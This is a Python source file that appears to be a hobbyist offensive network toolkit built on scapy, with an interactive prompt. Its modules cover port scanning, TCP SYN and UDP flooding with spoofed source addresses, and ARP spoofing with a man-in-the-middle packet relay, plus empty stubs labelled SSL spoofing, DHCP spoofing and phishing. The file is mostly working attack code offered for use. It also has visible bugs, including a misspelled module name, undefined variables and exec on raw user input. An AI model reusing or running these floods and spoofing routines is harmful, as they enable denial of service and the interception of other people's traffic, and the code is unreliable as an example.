#! /usr/bin/python
from scapy.all import *
import threading
from socket import *
import time
import sys,os
from random import *
from getch import getch
import multiprocessing
def ip2macaddr(ip_addr,gateway_addr):
	src_ip=gateway_addr
	random_shit=IP(src=src_ip,dst=ip_addr)/UDP(sport=1999,dport=80)
	th=threading.Thread(target=sendpackets,args=(random_shit,2))
	time.sleep(1)
	pqrs=detect_udp(src_ip,ip_addr,1999,80,3)
	if(pqrs[Ether].dst=="ff:ff:ff:ff:ff:ff"):
		print("[-] Failed to identify with UDP Scan. Manually configure MAC Address.")
		mac_addr=raw_input("[*] Configure MAC Address manually and enter it: ")
	else:
		print("[+] Identified MAC Address using UDP Scan: "+pqrs[Ether].dst)
	return pqrs[Ether].dst

def timer_load_bar(start_time,total_time):
	while True:
		cur_time=time.time()
		dtime=cur_time-start_time
		pcnt=round(dtime/total_time*100,2)
		if(pcnt>100):
			return
		nnn=int(pcnt/5)
		dx="|"+"="*nnn+">"+" "*(19-nnn)+"|"+" "+str(pcnt)+"%"
		sys.stdout.write("\r"+dx)
stop=False
DEFAULT_PORTS=[20,21,22,23,25,53,67,68,69,80,110,123,137,138,139,143,161,162,179,389,443,636,989,990]
def sendpackets(packet,timeout):
	st=time.time()
	while time.time()-st<timeout:
		try:
			send(packet,verbose=0)
		except:
			continue
def get_my_lan_mac_addr():
	path="/sys/class/ieee80211/phy0/macaddress"
	f=open(path,'r')
	return f.readline().strip('\n')
def get_my_lan_ip_addr():
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	addr=s.getsockname()[0]
	s.close()
	return addr
scan_log_sent=[]
scan_log_recv=[]
def send_packets_count(packet,count):
	global scan_log_sent
	minus=0
	for i in range(count):	
		try:
			send(packet,verbose=False)
		except:
			minus+=1
			continue
	scan_log_sent+=[[time.time(),packet,count,(count-minus)]]
def listen_to_tcp(src_ip,dst_ip,timeout):
	global scan_log_recv
	if(src_ip=="unknown" and dst_ip=="unknown"):
		scan_log_recv=sniff(filter="tcp",timeout=timeout)
	elif(src_ip=="unknown" and not dst_ip=="unknown"):
		scan_log_recv=sniff(filter="tcp and dst host "+dst_ip,timeout=timeout)
	elif(not src_ip=="unknown" and dst_ip=="unknown"):
		scan_log_recv=sniff(filter="tcp and src host "+src_ip,timeout=timeout)
	else:
		scan_log_recv=sniff(filter="tcp and src host "+src_ip+" and dst host "+dst_ip,timeout=timeout)
def flagtype2int(flagtype):
	flagtype=list(flagtype)
	ret=0
	flagdict={"N":256,"C":128,"E":64,"U":32,"A":16,"P":8,"R":4,"S":2,"F":1}
	for ch in flagtype:
		ret+=flagdict[ch]
	return ret
def format_pnum(portnum):
	l=len(str(portnum))
	return " "*(7-l)+str(portnum)
def scan():
	global scan_log_sent
	global scan_log_recv
	foundanything=False
	response_open={2:18}
	response_closed={2:20}
	what_i_should_do={2:8}
	#0 Does not exist 1 Exists but closed 2 Exists and opened
	target_ip=read_ipv4_addr("taget IP")
	ports2scan=DEFAULT_PORTS
	lll=len(ports2scan)
	flagtype=raw_input("SET TCP Flags >> ")
	try:
		flagtype=flagtype2int(flagtype)
	except:
		print("[-] Invalid flag syntax")
		return
	cnt=read_int("number of packets to send")
	timeout=read_float("timeout")
	port_status={portnum:0 for portnum in ports2scan}
	print("Initiating scan...")
	
	src=get_my_lan_ip_addr()
	packet=[]
	listener=threading.Thread(target=listen_to_tcp,args=(target_ip,src,timeout))
	listener.start()
	i=0
	procs=[]
	for portnum in ports2scan:
		packet+=[IP(src=src,dst=target_ip)/TCP(sport=randint(100,500),dport=portnum,flags=flagtype)]
		procs+=[multiprocessing.Process(target=send_packets_count,args=(packet,cnt))]
		procs[i].start()
		i+=1
	time.sleep(timeout+5)
	for i in range(lll):
		procs[i].terminate()
	print("[*] Scanning complete.")
	print("[+] Number of received responses: "+str(len(scan_log_recv)))
	expect_open=response_open[flagtype]
	expect_closed=response_closed[flagtype]
	#print("[*] Searching for packets with the following flag: "+str(expect))
	#scan_log_recv.summary()
	for packet in scan_log_recv:
		for portnum in ports2scan:
			if(packet[TCP].sport==portnum):
				#print("[*] E/R: "+str(expect)+"/"+str(packet[TCP].flags))
				if(packet[TCP].flags==expect_open):
					port_status[portnum]=2
				elif(packet[TCP].flags==expect_closed):
					port_status[portnum]=1
				else:
					port_status[portnum]=-1
				foundanything=True
	print("[*] Organizing scan results...")
	if(not foundanything):
		print("[-] No port seems to be responsive.")
		scan_log_recv=[]
		scan_log_sent=[]
		return
	for portnum in port_status:
		if(port_status[portnum]==1):
			print("[TCP] Port "+format_pnum(portnum)+" closed")
		if(port_status[portnum]==2):
			print("[TCP] Port "+format_pnum(portnum)+" open")
		if(port_status[portnum]==-1):
			print("[TCP] Port "+format_pnum(portnum)+" unknown")
	scan_log_recv=[]
	scan_log_sent=[]

	
def validate_ipv4(addr):
	addr=addr.split(".")
	if(len(addr)!=4):
		print("[-] Invalid ipv4 address: incompatible format")
		return False 
	for val in addr:
		if(int(val)>255):
			print("[-] Invalid ipv4 address: invalid size")
			return False
	return True

def detect_udp(src_ip,dst_ip,src_port,dst_port,timeout):
	global pqrs
	pqrs=Ether(src="00:00:00:00:00:00",dst="ff:ff:ff:ff:ff:ff")
	list_of_pacs=sniff(timeout=timeout)
	#find way to timeout
	for packet in list_of_pacs:
		if(packet.haslayer(IP) and packet[IP].src==src_ip and packet[IP].dst==dst_ip and packet.haslayer(UDP) and packet[UDP].sport==src_port and packet[UDP].dport==dst_port):
			pqrs=packet
			return pqrs
	return pqrs

def flood():
	#target_addr,target_port,src_addr,src_port,num_of_proc=100,ttr=10,flagp="S"
	type=raw_input("SET Type (TCP/UDP) >> ")
	type=type.strip("\n").upper()
	if(type=="TCP"):
		print("[+] Type=TCP")
		tcp_flood()
	elif(type=="UDP"):
		print("[+] Type=UDP")
		udp_flood()
	else:
		print("[-] Invalid syntax.")
		return 
def read_ipv4_addr(metaname):
	val=raw_input("SET "+metaname+" >> ")
	if(not validate_ipv4(val)):
		val=read_ipv4_addr(metaname)
	else:
		print("[*] "+metaname+" SET to "+val)
		return val
def read_int(metaname):
	val=raw_input("SET "+metaname+" >> ")
	try:
		val=int(val)
		print("[*] "+metaname+" SET to "+str(val))
		return val
	except:
		val=read_int(metaname)
def read_float(metaname):
	val=raw_input("SET "+metaname+" >> ")
	try:
		val=float(val)
		print("[*] "+metaname+" SET to "+str(val))
		return val
	except:
		val=read_float(metaname)
def read_bool(option):
	val=raw_input("Enable "+option+"? [Y/N]")
	val=val.strip("\n")
	if(val=="Y" or val=="y"):
		print("[+] Enabled.")
		return True
	else:
		print("[+] Disabled.")
		return False
def tcp_flood():
	flagp="S"
	tgt_addr=read_ipv4_addr("target IP")
	tgt_port=read_int("target Port")
	num_of_threads=read_int("firepower")
	ttr=read_float("time to run")
	randomq=read_bool("randomized source IP and Port")
	proc=[i for i in range(num_of_threads)]
	if(not randomq):
		src_addr=read_ipv4_addr("source IP")
		src_port=read_int("source port")
		packet=IP(dst=tgt_addr,src=src_addr)/TCP(sport=src_port,dport=tgt_port,flags=flagp)
		print("[+] Forged packet.")
		print("[*] Loading threads...")
		
		for i in range(num_of_threads):
			proc[i]=threading.Thread(target=sendpackets, args=(packet,ttr))
			proc[i].start()
		print("\n[+] All threads loaded.")
		thn=threading.activeCount()-num_of_threads
		while threading.activeCount()>thn:
			continue
		print("\n[+]Complete.")
	else:
		for i in range(num_of_threads):
			rand1=randint(1,256)
			rand2=randint(1,256)
			rand3=randint(1,256)
			rand4=randint(1,256)
			rand5=randint(80,65535)
			src_ip=str(rand1)+"."+str(rand2)+"."+str(rand3)+"."+str(rand4)
			src_port=rand5
			packet=IP(dst=tgt_addr,src=src_addr)/TCP(sport=src_port,dport=tgt_port,flags=flagp)
			proc[i]=thrading.Thread(target=sendpackets,args=(packet,ttr))
			proc[i].start()
		print("\n[+] All threads loaded.")
		thn=threading.activeCount()-num_of_threads
		while threading.activeCount()>thn:
			continue
		print("\n[+]Complete.")
def udp_flood():
	tgt_addr=read_ipv4_addr("target IP")
	tgt_port=read_int("target Port")
	num_of_proc=read_int("firepower")
	ttr=read_float("time to run")
	usetimer=read_bool("CLI timer")
	randomq=read_bool("randomized source IP and Port")
	proc=[i for i in range(num_of_proc)]
	if(not randomq):
		src_addr=read_ipv4_addr("source IP")
		src_port=read_int("source port")
		packet=IP(dst=tgt_addr,src=src_addr)/UDP(sport=src_port,dport=tgt_port)
		print("[+] Forged packet.")
		print("[*] Loading processes...")
		
		for i in range(num_of_proc):
			proc[i]=multiprocessing.Process(target=sendpackets, args=(packet,))
			proc[i].start()
		print("\n[+] All processes loaded.")
		timer_load_bar(time.time(),ttr)
		for i in range(num_of_proc):
			proc[i].terminate()
		print("\n[+] All processes terminated: Complete.")
	else:
		for i in range(num_of_proc):
			rand1=randint(1,256)
			rand2=randint(1,256)
			rand3=randint(1,256)
			rand4=randint(1,256)
			rand5=randint(80,65535)
			src_ip=str(rand1)+"."+str(rand2)+"."+str(rand3)+"."+str(rand4)
			src_port=rand5
			packet=IP(dst=tgt_addr,src=src_addr)/UDP(sport=src_port,dport=tgt_port)
			proc[i]=multiprocessing.Process(target=sendpackets,args=(packet,))
			proc[i].start()
		print("\n[+] All processes loaded.")
		if(usetimer):
			timer_load_bar(time.time(),ttr)
		else:
			print("[*] Wait...")
			time.sleep(ttr)
		for i in range(num_of_proc):
			proc[i].terminate()
		print("\n[+] All processes terminated: Complete.")

def arpspoof():
	print("[*] Autoconfiguring this device's MAC address.")
	src_mac=get_my_lan_mac_addr()
	print("[+] MAC Address found: "+src_mac)
	gateway_addr=read_ipv4_addr("default gateway IP")
	tgt_ip=read_ipv4_addr("target IP")
	tgt_mac=ip2macaddr(tgt_ip,gateway_addr)
	src_ip=get_my_lan_ip_addr()
	print("[*] This device's IP address was configured to be "+src_ip)
	num_of_threads=read_int("number of threads")
	ttr=read_int("time to run")
	arp_packet=ARP(hwsrc=src_mac,psrc=gateway_addr,hwdst=tgt_mac,pdst=tgt_ip)
	print("[+] Forged Spoofed ARP packet.")
	print("[*] Loading threads...")
	proc=[i for i in range(num_of_threads)]
	for i in range(num_of_threads):
		proc[i]=threading.Thread(target=sendpackets, args=(arp_packet,ttr))
		proc[i].start()
	router=threading.Thread(target=mitm_router,args=(tgt_ip,gateway_addr,ttr))
	router.start()
	print("[*] Initiated MITM router.")
	print("[+] All threads loaded.")
	thnum=threading.activeCount()-num_of_threads-1
	while threading.activeCount()>thnum:
		k=getch()
		if(k=='\n'):
			print(str(threading.activeCount())+" threads are active.")
	print("[+] Complete.")
def handle_packet(packet):
	if(not packet.haslayer(IP)):
		print("[-] Some goddman shit packet detected.")
	true_src_ip=packet[IP].src
	dst_ip=packet[IP].dst
	print("[Original packet] src: "+true_src_ip+" --> dst: "+dst_ip)
	send(packet,verbose=0)
	print("[+] Spoofed a packet!")
	
def mitm_router(src_ip,gateway_addr,timeout):
	filt="host "+src_ip+" and not arp"
	print("[+] Filter set to: "+filt)
	packets=sniff(prn=handle_packet, filter=filt,timeout=timeout)
	
def sslspoof():
	return 0
def dhcpspoof():
	return 0
def phish():
	return 0
def tracert_listener_b(timeout,expected_count,dest_ip):
	icmp_packets=sniff(timeout=timeout, filter="icmp and dst host "+get_my_lan_ip_addr())
	middle_nodes_raw=[packet[IP].src for packet in icmp_packets]
	lll=len(middle_nodes_raw)
	middle_nodes=[]
	for i in range(lll-1):
		if(middle_nodes_raw[i]==middle_nodes_raw[i+1]):
			continue
		else:
			middle_nodes+=[middle_nodes_raw[i]]
	nnn=len(middle_nodes)
	cnt=[0 for i in range(nnn)]
	for i in range(lll):
		for j in range(nnn):
			if(middle_nodes_raw[i]==middle_nodes[j]):
				cnt[j]+=1
	middle_nodes=[get_my_lan_ip_addr()]+middle_nodes+[dest_ip]
	for i in range(nnn):
		print("src: "+middle_nodes[i]+" --> dst: "+middle_nodes[i+1]+" *packets: "+str(cnt[i]))
def tracert_listener(timeout,dest_ip):
	icmp_packets=sniff(timeout=timeout, filter="icmp and dst host "+get_my_lan_ip_addr())
	middle_nodes=[packet[IP].src for packet in icmp_packets]
	middle_nodes=[get_my_lan_ip_addr()]+middle_nodes+[dest_ip]
	lll=len(middle_nodes)
	for i in range(lll-1):
		if(middle_nodes[i]==dest_ip):
			break
		print("src: "+middle_nodes[i]+" --> dst: "+middle_nodes[i+1])
def tracert():
	dest_ip=read_ipv4_addr("destination IP")
	dest_port=read_int("destination Port")
	recv_packets=[]
	timeout=5
	th=threading.Thread(target=tracert_listener,args=(timeout,dest_ip))
	th.start()
	time.sleep(1)
	for nnn in range(1,64):
		packet=IP(src=get_my_lan_ip_addr(),dst=dest_ip,ttl=nnn)/UDP(sport=7891,dport=dest_port)
		send_packets_count(packet,1)
	time.sleep(2)
def get_gateway_addr():
	my_ip=get_my_lan_ip_addr()

def tracert_b():
	dest_ip=read_ipv4_addr("destination IP")
	dest_port=read_int("destination Port")
	cnt=read_int("number of packets to send")
	recv_packets=[]
	timeout=5*cnt
	th=threading.Thread(target=tracert_listener,args=(timeout,cnt,dest_ip))
	th.start()
	time.sleep(1)
	for nnn in range(1,64):
		packet=IP(src=get_my_lan_ip_addr(),dst=dest_ip,ttl=nnn)/UDP(sport=7891,dport=dest_port)
		send_packets_count(packet,cnt)
	time.sleep(2)

def interpreter():
	cmd=raw_input(">> ")
	if "use" in cmd:
		param=cmd[3:].strip(" ").strip("\n").lower()
		#try:
		print("[+] Loading "+param)
		exec(param+"()")
		#except:
		#	print("[-] Unknown module: "+param)
		#	return
	if "exit" in cmd or "quit" in cmd:
		sys.exit()
if __name__=="__main__":
	while True:
		interpreter()
